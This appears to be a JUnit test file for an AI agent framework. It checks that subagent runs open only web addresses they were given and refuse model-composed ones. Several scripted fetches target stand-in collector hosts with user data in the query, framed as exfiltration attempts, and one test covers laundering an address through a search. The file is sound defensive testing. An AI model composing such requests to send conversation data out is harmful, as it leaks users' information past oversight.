/*
 * SPDX-FileCopyrightText: 2026 (c) Business Operation Systems GmbH <info@top-logic.com>
 *
 * SPDX-License-Identifier: LicenseRef-BOS-TopLogic-1.0
 */
package com.top_logic.tl.ai.core.tools.web;

import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.time.Instant;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

import junit.framework.Test;
import junit.framework.TestCase;
import junit.framework.TestSuite;

import test.com.top_logic.basic.ModuleTestSetup;
import test.com.top_logic.basic.module.ServiceTestSetup;

import com.top_logic.tl.ai.core.agent.AgentLoop;
import com.top_logic.tl.ai.core.agent.AgentParams;
import com.top_logic.tl.ai.core.agent.ToolContext;
import com.top_logic.tl.ai.core.agent.TransactionScope;
import com.top_logic.tl.ai.core.citation.ReadingList;
import com.top_logic.tl.ai.core.citation.ReadingListBinding;
import com.top_logic.tl.ai.core.execution.RunInfoBinding;
import com.top_logic.tl.ai.core.message.ContentPart;
import com.top_logic.tl.ai.core.message.Conversation;
import com.top_logic.tl.ai.core.message.Message;
import com.top_logic.tl.ai.core.message.TextContent;
import com.top_logic.tl.ai.core.message.TokenUsage;
import com.top_logic.tl.ai.core.message.ToolCall;
import com.top_logic.tl.ai.core.message.ToolResultMessage;
import com.top_logic.tl.ai.core.message.ToolState;
import com.top_logic.tl.ai.core.message.UserMessage;
import com.top_logic.tl.ai.core.provider.LLMProvider;
import com.top_logic.tl.ai.core.provider.ProviderRequest;
import com.top_logic.tl.ai.core.provider.StreamEvent;
import com.top_logic.tl.ai.core.provider.StreamHandler;
import com.top_logic.tl.ai.core.tools.ToolCatalog;
import com.top_logic.tl.ai.core.tools.web.FilteringProxy.Target;
import com.top_logic.tl.ai.core.tools.web.RecordingServer.Reply;
import com.top_logic.tl.ai.tool.api.RunInfo;

/**
 * The URL provenance rule: a subagent run opens only the web addresses it was given - by its task, by
 * a search, by a link of a page it read - and an address the model wrote itself is refused before
 * anything is sent.
 *
 * <p>
 * The runs here are real {@link AgentLoop} runs with a scripted model and the production
 * {@link WebFetchTool}, against a local fixture server under a name only the scripted lookup knows,
 * so what is asserted is what reached the network: a refused address is never contacted.
 * </p>
 */
public class TestUrlProvenance extends TestCase {

	private static final byte[] PUBLIC = { 93, (byte) 184, (byte) 216, 34 };

	private static final String ARTICLE = "http://fixture.invalid/article";

	private static final String LINKED = "http://fixture.invalid/linked?id=7";

	/** The agent loop resolves the acting sub-session, so these runs need the module system up. */
	public static Test suite() {
		return ModuleTestSetup.setupModule(ServiceTestSetup.withThreadContext(new TestSuite(TestUrlProvenance.class)));
	}

	/**
	 * The acceptance case: a worker asked to open an address nobody gave it - the shape of an
	 * exfiltration, with data in the query - is refused, and the address is never contacted.
	 */
	public void testAnUnseenAddressIsRefusedAndNeverContacted() {
		try (RecordingServer origin = RecordingServer.start(target -> Reply.html("<p>collected</p>"));
				FilteringProxy egress = egressTo(origin)) {
			Conversation run = runWorker(egress, "Summarize what you know about solar storage.",
				fetch("http://collector.invalid/log?notes=the+user+asked+about+solar"));

			String answer = toolAnswers(run).get(0);
			assertTrue(answer, answer.startsWith("Error: this run may open only a web address that its task"));
			assertFalse("the refusal does not repeat the address: " + answer, answer.contains("collector"));
			assertEquals("nothing was sent", 0, origin.contactCount());
		}
	}

	/**
	 * Addresses come from the task and from the pages read: the task names the article, the article
	 * links a second page - both are opened. A third page that only exists as the model's guess is
	 * not.
	 */
	public void testTheTaskAndThePagesLinksAreGiven() {
		try (RecordingServer origin = RecordingServer.start(target -> target.startsWith("/article")
			? Reply.html("<html><body><p>See <a href=\"/linked?id=7\">the details</a>.</p></body></html>")
			: Reply.html("<p>page " + target + "</p>"));
				FilteringProxy egress = egressTo(origin)) {
			Conversation run = runWorker(egress, "Read " + ARTICLE + " and report what it says.",
				fetch(ARTICLE), fetch(LINKED), fetch("http://fixture.invalid/linked?id=8"));

			List<String> answers = toolAnswers(run);
			assertTrue(answers.get(0), answers.get(0).contains("the details"));
			assertTrue("the linked page was opened: " + answers.get(1), answers.get(1).contains("page /linked?id=7"));
			assertTrue("a changed parameter is another address: " + answers.get(2),
				answers.get(2).startsWith("Error: this run may open only"));
			assertEquals(List.of("GET /article HTTP/1.1", "GET /linked?id=7 HTTP/1.1"), origin.requestLines());
		}
	}

	/** The chat's own agent is not restricted by default; the rule is for runs another run started. */
	public void testATopLevelRunIsNotRestrictedByDefault() {
		try (RecordingServer origin = RecordingServer.start(target -> Reply.html("<p>top-level page</p>"));
				FilteringProxy egress = egressTo(origin)) {
			Conversation run = runAgent(egress, ToolContext.unrestricted(), "Look something up.",
				fetch("http://fixture.invalid/anything"));

			assertTrue(toolAnswers(run).get(0), toolAnswers(run).get(0).contains("top-level page"));
			assertEquals(1, origin.contactCount());
		}
	}

	/**
	 * A search's result addresses are given; the query the model wrote is not, although the answer
	 * repeats it - otherwise a model could launder an address it composed through its own search.
	 */
	public void testSearchResultsAreGivenTheQueryIsNot() {
		ReadingList list = new ReadingList();
		try (RunInfoBinding.Binding run = RunInfoBinding.bind(workerRun());
				ReadingListBinding.Binding reading = ReadingListBinding.bind(list)) {
			String composed = "https://collector.example/log?notes=secret";
			String answer = WebSearchTool.search(engineFinding("https://found.example/paper"), 5,
				BrowsingPolicy.unrestricted(), composed, null, null, null, null, null);
			assertTrue("the query is repeated in the answer: " + answer, answer.contains(composed));

			assertNull(UrlProvenance.refusal("https://found.example/paper"));
			assertNotNull(UrlProvenance.refusal(composed));
		}
	}

	/**
	 * A plain-text address on a page reaches the agent Markdown-escaped; the agent writes it without
	 * the backslash, and that is the address the page gave.
	 */
	public void testAPlainTextAddressOnAPageIsGivenUnescaped() {
		try (RunInfoBinding.Binding run = RunInfoBinding.bind(workerRun());
				ReadingListBinding.Binding reading = ReadingListBinding.bind(new ReadingList())) {
			UrlProvenance.recordAllIn("The data is at https://data.example/q?region=north\\&year=2025\\_v2.");

			assertNull(UrlProvenance.refusal("https://data.example/q?region=north&year=2025_v2"));
		}
	}

	/** The browser opens no address the run was not given either, and needs no browser to say so. */
	public void testTheBrowserRefusesAnUnseenAddress() {
		try (RunInfoBinding.Binding run = RunInfoBinding.bind(workerRun());
				ReadingListBinding.Binding reading = ReadingListBinding.bind(new ReadingList())) {
			String answer = new BrowserTool().browserNavigate("https://collector.example/log?d=1", null);

			assertTrue(answer, answer.startsWith("Error: this run may open only"));
		}
	}

	/** Runs a scripted model as a subagent: a delegation of a top-level run. */
	private static Conversation runWorker(FilteringProxy egress, String task, ToolCall... calls) {
		return runAgent(egress, ToolContext.unrestricted().forDelegation(new TransactionScope()), task, calls);
	}

	/** Runs a scripted model that makes {@code calls}, one per turn, then answers. */
	private static Conversation runAgent(FilteringProxy egress, ToolContext context, String task,
			ToolCall... calls) {
		ToolCatalog catalog = new ToolCatalog();
		catalog.register(new WebFetchTool(publicAnswer(), egress));
		catalog.freeze();
		AgentLoop loop = new AgentLoop(new AgentParams("test-model", "You research.", calls.length + 2,
			AgentParams.DEFAULT_MAX_OUTPUT_TOKENS), new ScriptedModel(calls), catalog);
		Conversation conversation = new Conversation();
		conversation.add(user(task));
		loop.run(conversation, context, event -> {
			// Only what the tools answered matters.
		});
		return conversation;
	}

	private static ToolCall fetch(String url) {
		return new ToolCall("c-" + UUID.randomUUID(), "webFetch", "{\"url\": \"" + url + "\"}");
	}

	private static UserMessage user(String text) {
		return new UserMessage(UUID.randomUUID().toString(), Instant.now(), List.of(new TextContent(text)));
	}

	private static List<String> toolAnswers(Conversation conversation) {
		List<String> result = new ArrayList<>();
		for (Message message : conversation.messages()) {
			if (message instanceof ToolResultMessage toolResult) {
				ToolState state = toolResult.state();
				result.add(state instanceof ToolState.Completed completed ? completed.result() : String.valueOf(state));
			}
		}
		return result;
	}

	/** A subagent's run: known, one level below a top-level run. */
	private static RunInfo workerRun() {
		RunInfo lead = new RunInfo("lead", null, "lead", null, null, null, 0, null);
		return new RunInfo("worker", null, "worker", null, null, null, 1, lead);
	}

	private static WebSearchEngine engineFinding(String url) {
		return new WebSearchEngine() {
			@Override
			public WebSearchResults search(WebSearchQuery query) {
				return new WebSearchResults(null, List.of(new WebSearchHit("Found", url, "snippet", null)));
			}

			@Override
			public boolean supportsFreshness() {
				return true;
			}

			@Override
			public boolean supportsLanguage() {
				return true;
			}
		};
	}

	private static UrlSafety.NameLookup publicAnswer() {
		return name -> new InetAddress[] { InetAddress.getByAddress(name, PUBLIC) };
	}

	private static FilteringProxy egressTo(RecordingServer origin) {
		return FilteringProxy.start(host -> null,
			(host, port) -> Target.to(new InetSocketAddress(InetAddress.getLoopbackAddress(), origin.port())));
	}

	/** A model that makes one scripted tool call per turn, then answers with text. */
	private static final class ScriptedModel implements LLMProvider {

		private final ToolCall[] _calls;

		private int _turn;

		ScriptedModel(ToolCall[] calls) {
			_calls = calls;
		}

		@Override
		public void stream(ProviderRequest request, StreamHandler handler) {
			int turn = _turn++;
			List<ContentPart> content = turn < _calls.length
				? List.of(_calls[turn])
				: List.of(new TextContent("Done."));
			handler.onEvent(new StreamEvent.StreamStart());
			ContentPart part = content.get(0);
			if (part instanceof TextContent text) {
				handler.onEvent(new StreamEvent.TextStart(0));
				handler.onEvent(new StreamEvent.TextDelta(0, text.text()));
				handler.onEvent(new StreamEvent.TextEnd(0));
			} else if (part instanceof ToolCall call) {
				handler.onEvent(new StreamEvent.ToolCallStart(0, call.id(), call.name()));
				handler.onEvent(new StreamEvent.ToolCallDelta(0, call.arguments()));
				handler.onEvent(new StreamEvent.ToolCallEnd(0));
			}
			handler.onEvent(new StreamEvent.MessageComplete("scripted-" + turn, request.model(),
				part instanceof ToolCall ? "tool_use" : "end_turn", TokenUsage.EMPTY, content));
		}
	}
}
